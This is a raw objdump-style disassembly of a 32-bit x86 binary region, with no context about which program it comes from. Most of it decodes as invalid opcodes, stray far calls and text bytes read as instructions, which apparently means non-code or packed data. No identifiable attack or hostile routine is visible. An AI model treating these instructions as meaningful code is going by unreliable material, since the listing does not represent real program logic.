  414265:	jne    0x4142dc
  414267:	jne    0x41426a
  414269:	or     ebp,edx
	...
  414273:	add    bh,bh
  414275:	(bad)  
  414276:	push   eax
  414278:	jnp    0x4142c0
  41427a:	aam    0x26
  41427c:	data16 aas 
  41427e:	outs   dx,DWORD PTR ds:[esi]
  41427f:	aad    0x38
  414281:	sub    DWORD PTR [eax],0x6c352b03
  414287:	dec    edx
  414288:	sub    eax,DWORD PTR [edi-0x5f60e9d0]
  41428e:	(bad)  
  41428f:	push   DWORD PTR [esi-0x33000019]
  414295:	(bad)  
  414296:	(bad)  
  414297:	dec    DWORD PTR [ebx+edx*1]
  41429a:	stos   BYTE PTR es:[edi],al
  41429b:	rcl    BYTE PTR [edx],0x60
  41429e:	je     0x4142ae
  4142a0:	bound  ecx,QWORD PTR [ebp-0x1410e80]
  4142a6:	pop    esp
  4142a7:	icebp  
  4142a8:	and    esp,edx
  4142aa:	pop    ebx
  4142ab:	push   edi
  4142ac:	dec    edi
  4142ad:	call   0x7431:0x8bff2164
  4142b4:	push   cs
  4142b5:	das    
  4142b6:	mov    ecx,DWORD PTR [ebx-0x64429c75]
  4142bc:	pop    esp
  4142bd:	daa    
  4142be:	push   0x9ee27cff
  4142c3:	(bad)  
  4142c4:	loop   0x4142a9
  4142c6:	std    
  4142c7:	dec    eax
  4142c8:	ins    DWORD PTR es:[edi],dx
  4142c9:	ss in  al,0x58
  4142cc:	into   
  4142cd:	jb     0x414310
  4142cf:	ins    DWORD PTR es:[edi],dx
  4142d0:	dec    eax
  4142d1:	sahf   
  4142d2:	ins    BYTE PTR es:[edi],dx
  4142d3:	xchg   DWORD PTR [ecx+0x7c],esp
  4142d6:	pop    edi
  4142d7:	xor    cl,BYTE PTR fs:[edx]
  4142da:	fimul  DWORD PTR [edi+0x7b318b8b]
  4142e0:	mov    ecx,DWORD PTR [ebx+0x5050508b]
  4142e6:	push   eax
  4142e7:	push   eax
  4142e8:	push   eax
  4142e9:	push   eax
  4142ea:	push   eax
  4142eb:	push   eax
  4142ec:	mov    esi,0x3224
	...
  4142f9:	add    BYTE PTR [esp+esi*4+0x76],ah
  4142fd:	test   al,0x25
  4142ff:	push   ebp
  414300:	jl     0x41430b
  414302:	call   0xd56a:0x882d3be7
  414309:	dec    ecx
  41430a:	jae    0x4142f0
  41430c:	add    al,0xb
  41430e:	jmp    0xc600:0xadf415
  414315:	jmp    0x2d87c729
  41431a:	cmc    
  41431b:	mov    edi,0x76165651
  414320:	addr16 fwait
  414322:	outs   dx,DWORD PTR ds:[esi]
  414323:	cdq    
  414324:	cwde   
  414325:	ret    0xfb00
  414328:	pop    edi
  414329:	mov    ds:0xe35421ae,al
  41432e:	loope  0x41432a
  414330:	cmp    eax,0x40110000
  414335:	fild   WORD PTR [eax]
  414337:	add    cl,bl
  414339:	or     bl,dl
  41433b:	add    BYTE PTR [ebx-0x39ee7a29],al
  414341:	outs   dx,BYTE PTR ds:[esi]
  414342:	dec    esp
  414343:	jecxz  0x41431c
  414345:	xchg   ebp,eax
  414346:	mov    dh,0xdb
  414348:	xchg   esp,eax
  414349:	xchg   edx,eax
  41434a:	into   
  41434b:	mov    ds:0x5e24ff51,eax
  414350:	mov    ebx,0x17942b79
  414355:	add    DWORD PTR [ebx-0x7cb2e87d],0xffffff83
  41435c:	and    BYTE PTR [edi],0x83
  41435f:	add    DWORD PTR [ebx+0x75757575],0x75
  414366:	jne    0x4143dd
  414368:	jne    0x4143df
  41436a:	mov    edx,0xdd43c6af
  41436f:	nop
  414370:	mov    eax,0x61521ca1
  414375:	cmp    bl,ah
  414377:	div    cl
  414379:	dec    ecx
  41437a:	cmp    eax,0xc7c9f535
  41437f:	jns    0x41439b
  414381:	mov    bl,0x0
	...
  41438b:	inc    ebp
  41438c:	inc    ebp
  41438d:	and    DWORD PTR [ebx+0x5a],edi
  414390:	ret    0x4545
  414393:	test   BYTE PTR [ebx+0xe],cl
  414396:	jae    0x41431a
  414398:	adc    bl,BYTE PTR [edi]
  41439a:	mov    edi,0x15e9e156
  41439f:	fwait
  4143a0:	loop   0x41439b
  4143a2:	xchg   DWORD PTR [eax+edx*1-0x5779d186],edi
  4143a9:	les    edx,FWORD PTR [ebp-0x34]
  4143ac:	std    
  4143ad:	outs   dx,DWORD PTR ds:[esi]
  4143ae:	mov    bl,0x4
  4143b0:	daa    
  4143b1:	int    0xc6
  4143b3:	xor    eax,0x45455f23
  4143b8:	nop
  4143b9:	mov    bh,0x45
  4143bb:	inc    ebp
  4143bc:	in     al,0x81
  4143be:	xchg   BYTE PTR [ebp+0x0],al
  4143c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143c2:	retf   
  4143c3:	(bad)  
  4143c4:	cmp    bl,cl
  4143c6:	rcr    BYTE PTR [eax-0x52],1
  4143c9:	call   FWORD PTR [edx+0x4b]
  4143cc:	mov    edx,0x32577de4
  4143d1:	inc    ebx
  4143d2:	aam    0x98
  4143d4:	mov    fs,WORD PTR ds:0xc427d9
  4143da:	add    BYTE PTR [eax],al
  4143dc:	sub    DWORD PTR [ecx+0x55],ecx
  4143df:	inc    edi
  4143e0:	lahf   
  4143e1:	push   cs
  4143e2:	xchg   edx,eax
  4143e3:	sbb    esp,DWORD PTR [ecx-0x32]
  4143e6:	fadd   DWORD PTR [ebx-0x46bc8527]
  4143ec:	out    0x70,eax
  4143ee:	sahf   
  4143ef:	cld    
  4143f0:	or     ebx,ecx
  4143f2:	pop    eax
  4143f3:	(bad)  
  4143f4:	in     eax,dx
  4143f5:	jae    0x414460
  4143f7:	push   ebp
  4143f8:	add    DWORD PTR [eax],0x8eff9000
  4143fe:	add    BYTE PTR [eax],al
  414400:	add    al,ch
  414402:	call   0xe92a2cef
  414407:	call   0x67e02cf4
  41440c:	test   eax,0x0
  414411:	add    BYTE PTR [eax],al
  414413:	add    BYTE PTR [eax],al
  414415:	add    BYTE PTR [eax],al
  414417:	add    BYTE PTR [edi+0x38],dl
  41441a:	sbb    eax,0x681d0faa
  41441f:	sub    cl,BYTE PTR [eax-0x57]
  414422:	sti    
  414423:	jne    0x414431
  414425:	or     edi,0x1
  414428:	ja     0x414472
  41442a:	ror    BYTE PTR [edx],0xc4
  41442d:	add    al,BYTE PTR [ebx+edx*2+0x158c0000]
  414434:	add    BYTE PTR [eax],al
  414436:	std    
  414437:	inc    ecx
  414438:	add    BYTE PTR [eax],al
  41443a:	pop    ebx
  41443b:	mov    al,0x33
  41443d:	pop    es
  41443e:	mov    ds:0x90cf575f,eax
  414443:	adc    eax,0x21a24f14
  414448:	bound  eax,QWORD PTR [edx]
  41444a:	jecxz  0x41441e
  41444c:	mov    bl,0xb4
  41444e:	cmp    BYTE PTR [ecx*8-0x34ffff87],0x50
  414456:	push   ecx
  414457:	pushf  
  414458:	add    BYTE PTR [eax],al
  41445a:	add    BYTE PTR [edx+ebp*2],ah
  41445d:	popa   
  41445e:	adc    DWORD PTR [ecx],0xffffffae
  414461:	and    BYTE PTR [esi],dl
  414463:	fidivr WORD PTR [edx+0x8]
  414466:	stc    
  414467:	mov    ds:0x655ff286,eax
  41446c:	fs xchg esp,eax
  41446e:	retf   0x4e7f
  414471:	mov    al,0x78
  414473:	pop    esi
  414474:	jbe    0x41440a
  414476:	xchg   esi,eax
  414477:	in     al,dx
  414478:	pop    edi
  414479:	cmp    ecx,DWORD PTR ds:0x4dc0bc
  41447f:	add    BYTE PTR [ecx+0x4c],ch
  414482:	add    BYTE PTR [eax],al
  414484:	add    BYTE PTR [ebx-0x7c7c7c7d],al
  41448a:	add    DWORD PTR [ebx+0x634d8383],0x76
  414491:	(bad)  
  414492:	(bad)  
  414493:	(bad)  
  414494:	(bad)  
  414495:	(bad)  
  414496:	(bad)  
  414497:	(bad)  
  414498:	(bad)  
  414499:	dec    DWORD PTR [ebx+0x7f06238b]
  41449f:	ds push 0x7263530c
  4144a5:	ins    DWORD PTR es:[edi],dx
  4144a6:	cmp    al,0x6e
  4144a8:	and    BYTE PTR [ebp+0x72],cl
  4144ab:	outs   dx,DWORD PTR ds:[esi]
  4144ac:	and    dh,BYTE PTR [esi+0x65]
  4144af:	and    BYTE PTR ds:0x630a2072,bh
  4144b5:	jo     0x414524
  4144b7:	cs jae 0x4144da
  4144ba:	je     0x414509
  4144bc:	jne    0x414523
  4144be:	arpl   WORD PTR [ecx+0x3e],bp
  4144c1:	gs inc ecx
  4144c3:	jb     0x41452a
  4144c5:	ins    DWORD PTR es:[edi],dx
  4144c6:	outs   dx,DWORD PTR ds:[esi]
  4144c7:	imul   ecx,DWORD PTR [edx],0x204d7420
  4144cd:	popa   
  4144ce:	jb     0x4144f0
  4144d0:	push   ebx
  4144d1:	je     0x414511
  4144d3:	gs bound sp,DWORD PTR gs:[bx+si]
  4144d9:	popa   
  4144da:	or     eax,0x6d727263
  4144df:	inc    ecx
  4144e0:	cmp    ch,BYTE PTR [esi]
  4144e2:	adc    DWORD PTR [edi+0x709aaa],esi
  4144e8:	in     eax,dx
  4144e9:	add    DWORD PTR [edx],esi
  4144eb:	out    dx,al
  4144ec:	scas   eax,DWORD PTR es:[edi]
  4144ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144ee:	into   
  4144ef:	pop    esi
  4144f0:	jl     0x414548
  4144f2:	jmp    0x41450c
  4144f4:	mov    ecx,DWORD PTR [ebx-0x1285661b]
  4144fa:	cmp    ebp,DWORD PTR [eax-0x3607e364]
  414500:	out    dx,al
  414501:	outs   dx,BYTE PTR ds:[esi]
  414502:	or     eax,0xa016bf5
  414507:	push   ss
  414508:	mov    al,0xa9
  41450a:	aad    0x76
  41450c:	into   
  41450d:	cmp    esi,DWORD PTR [ecx-0x6b]
  414510:	inc    esi
  414511:	inc    esp
  414512:	push   0x2b638b8b
  414517:	mov    ecx,DWORD PTR ss:[ebx-0x74ff18f1]
  41451e:	push   DWORD PTR [ebx]
  414520:	cmp    BYTE PTR [ecx-0x3078ed65],dh
  414526:	pushf  
  414527:	popf   
  414528:	pop    edi
  414529:	push   edi
  41452a:	push   ebx
  41452b:	out    0xbd,al
  41452d:	pop    edi
  41452e:	icebp  
  41452f:	sahf   
  414530:	outs   dx,BYTE PTR ds:[esi]
  414531:	mov    BYTE PTR [ebx-0x3b],al
  414534:	rcl    BYTE PTR [eax-0x1f],0xff
  414538:	(bad)  
  414539:	(bad)  
  41453a:	std    
  41453b:	cld    
  41453c:	(bad)  
  41453d:	dec    DWORD PTR [ebp+0x22]
  414540:	(bad)  
  414541:	(bad)  
  414542:	inc    DWORD PTR [eax]
	...
  41454c:	std    
  41454d:	cmp    esi,DWORD PTR [ecx-0x6c]
  414550:	mov    edx,0x612168a0
  414555:	bnd je 0x4145b8
  414558:	jg     0x4144f3
  41455a:	aad    0xaf
  41455c:	jo     0x4145d1
  41455e:	ins    DWORD PTR es:[edi],dx
  41455f:	sbb    al,0x89
  414561:	dec    ebp
  414562:	mov    eax,0x4c
  414567:	add    BYTE PTR [eax],al
  414569:	add    BYTE PTR [eax],al
  41456b:	add    BYTE PTR [eax],al
  41456d:	(bad)  
  41456e:	dec    ecx
  414570:	xchg   bh,ch
  414572:	push   ds
  414573:	(bad)  
  414574:	push   DWORD PTR [ecx]
  414576:	lahf   
  414577:	mov    dl,0xa6
  414579:	dec    esp
  41457a:	gs pop esp
  41457c:	mov    ah,dl
  41457e:	push   ecx
  41457f:	test   DWORD PTR [ecx+0x298ea62d],0x7d0c97a0
  414589:	and    cl,BYTE PTR ds:0x6ac8a322
  41458f:	ja     0x414511
  414591:	out    dx,al
  414592:	mov    BYTE PTR [ebx+0x5e07901b],ch
  414598:	(bad)  
  414599:	call   FWORD PTR [ebx-0x63]
  41459c:	(bad)  
  41459d:	(bad)  
  41459e:	cmp    DWORD PTR [esi+0x6e],ecx
  4145a1:	inc    DWORD PTR [eax]
  4145a3:	and    BYTE PTR [edi],bh
  4145a5:	ret    0x752c
  4145a8:	mov    bh,0xb5
  4145aa:	adc    DWORD PTR [ebx],ebx
  4145ac:	sub    DWORD PTR [esi-0x64e408cd],edi
  4145b2:	in     eax,dx
  4145b3:	add    bh,BYTE PTR [ebp+eiz*8-0x62]
  4145b7:	adc    DWORD PTR [ebx+ebx*1+0xf4],ebx
  4145be:	pop    edi
  4145bf:	dec    eax
  4145c0:	xor    DWORD PTR ds:0xfc8fde1f,ebp
  4145c6:	bound  ecx,QWORD PTR [ecx]
  4145c8:	jbe    0x414610
  4145ca:	stc    
  4145cb:	mov    bh,0xe3
  4145cd:	std    
  4145ce:	scas   al,BYTE PTR es:[edi]
  4145cf:	data16 add bh,BYTE PTR [esi-0x49ab58fa]
  4145d6:	jecxz  0x4145b7
  4145d8:	cs xchg edi,eax
  4145da:	mov    ecx,0xbd8f0000
  4145df:	sti    
	...
  4145ec:	add    al,BYTE PTR [eax]
  4145ee:	in     eax,dx
  4145ef:	(bad)  
  4145f0:	(bad)  
  4145f1:	(bad)  
  4145f2:	(bad)  
  4145f3:	(bad)  
  4145f4:	(bad)  
  4145f5:	(bad)  
  4145f6:	(bad)  
  4145f7:	inc    DWORD PTR [eax]
  4145f9:	add    BYTE PTR [eax-0x2e],ah
  4145fc:	(bad)  
  4145fd:	xchg   ebp,eax
  4145fe:	(bad)  
  414600:	rcl    ch,1
  414602:	mov    al,0x70
  414604:	int3   
  414605:	mov    bl,bl
  414607:	push   edi
  414608:	leave  
  414609:	fst    DWORD PTR [esi-0x5227f5df]
  41460f:	inc    DWORD PTR [esi+0x4b000090]
  414615:	lock add BYTE PTR [eax],al
  414618:	mov    ah,0xdd
  41461a:	add    BYTE PTR [eax],al
  41461c:	mov    ch,0x5c
  41461e:	pop    ds
  41461f:	mov    bl,0x99
  414621:	mov    ebp,0x6673979f
  414626:	cmp    ecx,0x6a2b4b0e
  41462c:	xor    DWORD PTR [eax+0x59925547],eax
  414632:	ins    DWORD PTR es:[edi],dx
  414633:	in     eax,dx
  414634:	add    BYTE PTR [ecx-0x6b59b70d],cl
  41463a:	mov    DWORD PTR [ecx-0x741c1177],ecx
  414640:	sbb    eax,DWORD PTR [eax+0x668bfab]
  414646:	mov    ds:0xfb1b5f65,eax
  41464b:	cmp    DWORD PTR ds:0x89cda1e7,edx
  414651:	cs ret 0x5b88
  414655:	cdq    
  414656:	(bad)  
  414657:	sub    dl,BYTE PTR [ebx+0x5a33f573]
  41465d:	sub    DWORD PTR [ebx-0x32],0xffffff89
  414661:	mov    DWORD PTR [edi+0x3d],ecx
  414664:	mov    DWORD PTR [ecx+0x74747489],ecx
  41466a:	je     0x4146e0
  41466c:	je     0x4146e2
  41466e:	je     0x4146e4
  414670:	test   al,0x6b
  414672:	xchg   ecx,eax
	...
  41467b:	add    BYTE PTR [edx+0x6a],ch
  41467e:	fnstsw WORD PTR [ebp+0x6d0b1c58]
  414684:	lea    ecx,[eax+0x46df1052]
  41468a:	and    al,0xd5
  41468c:	dec    eax
  41468d:	aas    
  41468e:	cwde   
  41468f:	add    eax,0xffffffa4
  414692:	mov    DWORD PTR [esi-0x1f],edi
  414695:	push   eax
  414696:	push   0x6a
  414698:	add    eax,0xfd9087fd
  41469d:	fdiv   DWORD PTR [eax-0xe1a3cca]
  4146a3:	fs lahf 
  4146a5:	pop    esi
  4146a6:	loop   0x41470f
  4146a8:	add    ebx,esp
  4146aa:	xchg   ebp,eax
  4146ab:	sbb    al,0x93
  4146ad:	out    0x68,al
  4146af:	and    BYTE PTR gs:[esi],ch
  4146b2:	imul   ebp,DWORD PTR [esi],0x74527965
  4146b8:	jb     0x414727
  4146ba:	and    BYTE PTR [edx],cl
  4146bc:	ja     0x4146ec
  4146be:	jb     0x414721
  4146c0:	jb     0x414727
  4146c2:	ins    DWORD PTR es:[edi],dx
  4146c3:	ins    DWORD PTR es:[edi],dx
  4146c4:	imul   ebp,DWORD PTR [ecx+0x65],0xa636665
  4146cb:	popa   
  4146cc:	inc    esp
  4146cd:	das    
  4146ce:	inc    ecx
  4146cf:	bound  ecx,QWORD PTR gs:[edx]
  4146d2:	or     dh,BYTE PTR [eax+0x6e]
  4146d5:	and    dh,BYTE PTR [eax+0x6f]
  4146d8:	and    BYTE PTR [ebp+0x6f],cl
  4146db:	jb     0x414742
  4146dd:	ins    DWORD PTR es:[edi],dx
  4146de:	ins    DWORD PTR es:[edi],dx
  4146df:	cs inc esi
  4146e1:	push   0x743e6220
  4146e6:	gs cs push ebx
  4146e9:	jb     0x41475a
  4146eb:	ins    DWORD PTR es:[edi],dx
  4146ec:	das    
  4146ed:	je     0x414711
  4146ef:	jo     0x414756
  4146f1:	jbe    0x414754
  4146f3:	outs   dx,BYTE PTR ds:[esi]
  4146f4:	ins    DWORD PTR es:[edi],dx
  4146f5:	addr16 jo 0x41475c
  4146f8:	jne    0x41475f
  4146fa:	and    BYTE PTR gs:[ecx+0x74],ch
  4146fe:	jb     0x414753
  414700:	dec    ebp
  414701:	ins    DWORD PTR es:[edi],dx
  414702:	gs jb  0x414733
  414705:	outs   dx,DWORD PTR ds:[esi]
  414706:	arpl   WORD PTR gs:[ebp+0x20],sp
  41470a:	and    BYTE PTR [ebx+0x3a],dh
  41470d:	jb     0x41477b
  41470f:	ins    DWORD PTR es:[edi],dx
  414710:	je     0x41478b
  414712:	gs ins DWORD PTR es:[edi],dx
  414714:	bound  esp,QWORD PTR [eax-0x6bd84475]
  41471a:	push   0x6a
  41471c:	add    eax,0x6a6a5797
  414721:	(bad)  
  414722:	(bad)  
  414724:	push   0xffffff85
  414726:	je     0x4146ba
  414728:	fs gs adc eax,0x3dbf2b30
  41472f:	icebp  
  414730:	sar    BYTE PTR [ebx-0x2227b2c4],cl
  414736:	jb     0x41477d
  414738:	sbb    al,0xab
  41473a:	mov    esi,0x85ef49df
  41473f:	test   DWORD PTR [ebp-0x7a7a2a5c],eax
  414745:	inc    edx
  414746:	das    
  414747:	test   DWORD PTR [ebp+0x74747485],eax
  41474d:	je     0x4147c3
  41474f:	je     0x4147c5
  414751:	je     0x4147c7
  414753:	pusha  
  414754:	lock lods al,BYTE PTR ds:[esi]
  414756:	mov    ds:0x9ad7f5aa,al
  41475b:	ja     0x414742
  41475d:	adc    DWORD PTR [edx+esi*1],ebp
  414760:	lods   eax,DWORD PTR ds:[esi]
  414761:	mov    ch,0xa1
  414763:	int3   
  414764:	(bad)  
  414765:	pop    ds
  414766:	jl     0x41477a
  414768:	push   ebx
  414769:	(bad)  
  41476c:	mov    DWORD PTR [ecx-0x76767677],ecx
  414772:	mov    DWORD PTR [ecx-0x7cd41718],ecx
  414778:	popa   
  414779:	aaa    
  41477a:	call   0x98e45167
  41477f:	pushf  
  414780:	sub    eax,0x74499990
  414785:	xor    edx,DWORD PTR [esi+ebp*8]
  414788:	(bad)  
  414789:	das    
  41478a:	push   cs
  41478b:	sub    BYTE PTR [ebp+0x7],al
  41478e:	data16 daa 
  414790:	xchg   esp,eax
  414791:	jecxz  0x41479d
  414793:	mov    ebp,DWORD PTR [ebp+0x72]
  414796:	leave  
  414797:	ret    
  414798:	shl    bh,0xab
  41479b:	mov    ah,0x52
  41479d:	cmp    bl,BYTE PTR [eax+ebp*8]
  4147a0:	call   0xe9298fb4
  4147a5:	xchg   esp,eax
  4147a6:	shl    DWORD PTR [eax],0xe8
  4147a9:	int3   
  4147aa:	mov    WORD PTR [ebp+eiz*2-0x4fc1a285],?
  4147b1:	arpl   WORD PTR [edi+0x71],di
  4147b4:	nop
  4147b5:	clc    
  4147b6:	mov    al,0x1c
  4147b8:	push   es
  4147b9:	dec    esp
  4147ba:	jp     0x414744
  4147bc:	arpl   WORD PTR [esi],cx
  4147be:	push   es
  4147bf:	sub    edi,DWORD PTR [ebp-0x333333da]
  4147c5:	sbb    DWORD PTR ds:[ebx+0x6a],eax
  4147c9:	sub    al,0xdc
  4147cb:	xor    ecx,DWORD PTR [esi+0x3dfa70ab]
  4147d1:	out    dx,eax
  4147d2:	test   DWORD PTR [eax],ebx
  4147d4:	pop    edi
  4147d5:	lahf   
  4147d6:	dec    eax
  4147d7:	out    dx,eax
  4147d8:	or     bl,ch
  4147da:	xchg   DWORD PTR gs:[edi+0x22],ebx
  4147de:	stos   BYTE PTR es:[edi],al
  4147df:	cmp    BYTE PTR ds:0x3ccccc3d,ch
  4147e5:	or     eax,0xcccccc43
	...
  4147f2:	add    BYTE PTR [esi+0x70],dh
  4147f5:	jmp    0x4147fb
  4147f7:	add    al,0x4
  4147f9:	add    al,0x4
  4147fb:	add    al,0x4
  4147fd:	add    al,0x4
  4147ff:	add    BYTE PTR [eax],al
  414801:	subps  xmm4,XMMWORD PTR ds:0x8ba4f3ab
  414808:	pop    ds
  414809:	das    
  41480a:	outs   dx,DWORD PTR ds:[esi]
  41480b:	mov    eax,0xff6e3eaf
  414810:	retf   
  414811:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414812:	adc    DWORD PTR [edx-0x7b],ebp
  414815:	fisttp WORD PTR [edi]
  414817:	(bad)
  41481a:	add    BYTE PTR [ebp-0x6b],dh
  41481d:	add    BYTE PTR [eax],al
  41481f:	outs   dx,DWORD PTR ds:[esi]
  414820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414821:	add    BYTE PTR [eax],al
  414823:	mov    bl,0xe2
  414825:	xchg   ebp,esp
  414827:	adc    DWORD PTR [eax+0x40039014],0xffffffcc
  41482e:	iret   
  41482f:	mov    eax,esp
  414831:	jo     0x414831
  414833:	cmp    al,ah
  414835:	bound  esi,QWORD PTR [edx+0x22]
  414838:	out    dx,eax
  414839:	mov    bh,0xb0
  41483b:	add    BYTE PTR [eax],al
  41483d:	adc    DWORD PTR [edx+0x9a38],esp
  414843:	add    BYTE PTR [ebx-0x31f5d569],bh
  414849:	inc    edi
  41484a:	retf   
  41484b:	and    ebp,DWORD PTR [edi+edx*1+0x16a36287]
  414852:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414853:	or     ch,ch
  414855:	pop    es
  414856:	inc    esp
  414857:	call   0xaf3b5818
  41485c:	fsubrp st(1),st
  41485e:	loopne 0x4148b2
  414860:	hlt    
  414861:	test   BYTE PTR [ecx-0x78c29d4a],bl
  414867:	add    BYTE PTR [eax],al
  414869:	inc    esp
  41486a:	aam    0x0
	...
  414874:	add    BYTE PTR [eax],al
  414876:	add    BYTE PTR [edx-0x4664],dh
  41487c:	(bad)  
  41487d:	(bad)  
  41487e:	(bad)  
  41487f:	(bad)  
  414880:	(bad)  
  414881:	(bad)  
  414882:	dec    DWORD PTR [ebx-0xc82da75]
  414888:	inc    ebp
  414889:	push   edx
  41488a:	ret    0xfb48
  41488d:	mov    ds:0xe629e7a9,al
  414892:	cmp    dh,0x9c
  414895:	data16 add al,0x5d
  414898:	lds    ebp,FWORD PTR [ebp-0x74102b4d]
  41489e:	mov    ebp,ebx
  4148a0:	inc    ebx
  4148a1:	xor    BYTE PTR ds:0x47d9ba58,dl
  4148a7:	imul   edx,DWORD PTR [ebp+0x4a],0xffffffae
  4148ab:	cmc    
  4148ac:	cs cli 
  4148ae:	aaa    
  4148af:	jp     0x414881
  4148b1:	pusha  
  4148b2:	inc    edi
  4148b3:	jb     0x4148e4
  4148b5:	xchg   DWORD PTR [esi+edx*4],esi
  4148b8:	gs in  al,0xb
  4148bb:	dec    ecx
  4148bc:	mov    ecx,DWORD PTR [ebx-0x74873312]
  4148c2:	mov    ebp,DWORD PTR [edi+edi*2]
  4148c5:	in     eax,0x8b
  4148c7:	add    BYTE PTR [ecx-0x70ba62a0],dl
  4148cd:	ins    DWORD PTR es:[edi],dx
  4148ce:	mov    ?,WORD PTR [ebp-0x2b]
  4148d1:	dec    eax
  4148d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148d3:	push   ebx
  4148d4:	cs popf 
  4148d6:	xor    dl,BYTE PTR [esi]
  4148d8:	pushf  
  4148d9:	sbb    al,BYTE PTR fs:[ecx]
  4148dc:	lods   al,BYTE PTR ds:[esi]
  4148dd:	ret    
  4148de:	or     ch,BYTE PTR [ecx+0x0]
  4148e1:	add    BYTE PTR [eax],al
  4148e3:	stos   BYTE PTR es:[edi],al
  4148e4:	nop
  4148e5:	add    BYTE PTR [eax],al
  4148e7:	xor    dl,cl
	...
  4148f5:	push   cs
  4148f6:	and    DWORD PTR [esi+0x13b3fca2],edi
  4148fc:	jecxz  0x4148c9
  4148fe:	dec    esp
  4148ff:	aas    
  414900:	cmp    eax,0xf5ccf233
  414905:	cmp    ch,BYTE PTR [edi-0x9]
  414908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414909:	pop    ebp
  41490a:	jecxz  0x41497b
  41490c:	sbb    al,BYTE PTR [eax]
	...
  414916:	add    DWORD PTR [ebx+0x435673e5],0xffffff83
  41491d:	or     edi,0x6c
  414920:	je     0x41490f
  414922:	mov    dh,0xab
  414924:	leave  
  414925:	inc    eax
  414926:	fsub   DWORD PTR [eax]
  414928:	(bad)  
  41492a:	inc    ebp
  41492b:	jl     0x4148c3
  41492d:	jo     0x414916
  41492f:	adc    ch,cl
  414931:	sub    al,0x90
  414933:	sbb    dl,BYTE PTR [ebx]
  414935:	(bad)  
  414936:	aam    0x1
  414938:	jge    0x41498d
  41493a:	jecxz  0x414904
  41493c:	pop    esi
  41493d:	(bad)  
  41493e:	jp     0x4148e1
  414940:	ins    DWORD PTR es:[edi],dx
  414941:	add    DWORD PTR [ebx-0x7c7cb557],0xffffffa7
  414948:	dec    eax
  414949:	ja     0x4148ce
  41494b:	mov    ecx,DWORD PTR [ebx+0x57186198]
  414951:	mov    eax,ds:0x52c915ea
  414956:	inc    esi
  414957:	addr16 mov esi,ebx
  41495a:	jbe    0x414927
  41495c:	mov    cl,0x2
  41495e:	inc    ebx
  41495f:	arpl   WORD PTR [edi-0x7419ca65],cx
  414965:	mov    ecx,DWORD PTR [ebx-0x28c3fe12]
  41496b:	add    eax,0x5ef5c248
  414970:	sub    al,0xd8
  414972:	jns    0x414936
  414974:	push   0xffffff9e
  414976:	push   esp
  414977:	pop    edx
  414978:	mov    eax,0xe9a8ddda
  41497d:	pop    ebx
  41497e:	pop    DWORD PTR [edi]
  414980:	leave  
  414981:	and    DWORD PTR [esi+esi*2-0x75],0xffffff8b
  414986:	push   ecx
  414987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414988:	out    dx,eax
  414989:	mov    ecx,DWORD PTR [ebx+0x8b]
  41498f:	add    BYTE PTR [eax],al
  414991:	add    BYTE PTR [eax],al
  414993:	add    BYTE PTR [eax],al
  414995:	aam    0xba
  414997:	push   ebx
  414998:	jne    0x414a0f
  41499a:	jne    0x414a11
  41499c:	jne    0x414a13
  41499e:	jne    0x414a15
  4149a0:	jne    0x4149c6
  4149a2:	and    al,0xcb
  4149a4:	add    BYTE PTR [esi-0x69],dh
  4149a7:	pusha  
  4149a8:	or     al,0x20
  4149aa:	(bad)  
  4149ab:	jb     0x4149b2
  4149ad:	and    al,0x1e
  4149af:	mov    cl,0x63
  4149b1:	lock popa 
  4149b3:	or     DWORD PTR [eax],esi
  4149b5:	add    BYTE PTR cs:[eax+0x74],ah
  4149b9:	cmp    al,BYTE PTR [esi]
  4149bb:	and    al,0x24
  4149bd:	fsubr  st(4),st
  4149bf:	and    al,0x24
  4149c1:	pop    esi
  4149c2:	leave  
  4149c3:	and    al,0x24
  4149c5:	leave  
  4149c6:	add    DWORD PTR [edx-0x12],esp
  4149c9:	ja     0x414a3a
  4149cb:	push   cs
  4149cc:	rol    DWORD PTR [ecx-0x5b09c93d],0x92
  4149d3:	dec    esi
  4149d4:	in     al,0x86
  4149d6:	xlat   BYTE PTR ds:[ebx]
  4149d7:	dec    ecx
  4149d8:	cmp    eax,0x9d872a10
  4149dd:	and    al,0x8d
  4149df:	sbb    ecx,DWORD PTR [ebx+edi*8-0x72727265]
  4149e6:	leave  
  4149e7:	mov    bh,0xe1
  4149e9:	rcr    ch,cl
  4149eb:	or     al,BYTE PTR [ebx+0x1b]
  4149ee:	ror    ebp,cl
  4149f0:	or     dh,ah
  4149f2:	pop    ecx
  4149f3:	xor    ebp,ebx
  4149f5:	sub    cl,BYTE PTR [edi-0xe]
  4149f8:	mov    bh,al
  4149fa:	out    0x70,eax
  4149fc:	and    BYTE PTR [esi],ch
  4149fe:	push   edx
  4149ff:	outs   dx,BYTE PTR ds:[esi]
  414a00:	jo     0x414a43
  414a02:	data16 and BYTE PTR [bx+si+0x74],dh
  414a07:	jae    0x414a78
  414a09:	or     ah,BYTE PTR [eax]
  414a0b:	inc    ebx
  414a0c:	cmp    eax,0x792e794d
  414a11:	bound  esp,QWORD PTR gs:[edx]
  414a14:	jae    0x414a84
  414a16:	cs cs jbe 0x414a48
  414a1a:	jae    0x414a29
  414a1c:	outs   dx,DWORD PTR ds:[esi]
  414a1d:	and    BYTE PTR [ebp+0x2e],ch
  414a20:	ins    DWORD PTR es:[edi],dx
  414a21:	jae    0x414a91
  414a23:	ins    DWORD PTR es:[edi],dx
  414a24:	cmp    al,0x2e
  414a26:	push   ebx
  414a27:	push   ebx
  414a28:	ins    DWORD PTR es:[edi],dx
  414a29:	inc    ecx
  414a2a:	outs   dx,BYTE PTR ds:[esi]
  414a2b:	outs   dx,DWORD PTR ds:[esi]
  414a2c:	outs   dx,DWORD PTR ds:[esi]
  414a2d:	arpl   WORD PTR gs:0x5757696f,cx
  414a34:	gs and BYTE PTR ds:[ebx+edx*2+0x44],al
  414a3a:	dec    ebp
  414a3b:	imul   eax,DWORD PTR [ecx+0x6d],0x652c6174
  414a42:	inc    ecx
  414a43:	jb     0x414ab7
  414a45:	gs je  0x414ab8
  414a48:	and    BYTE PTR [esi],ch
  414a4a:	and    BYTE PTR [ecx+0x53],ch
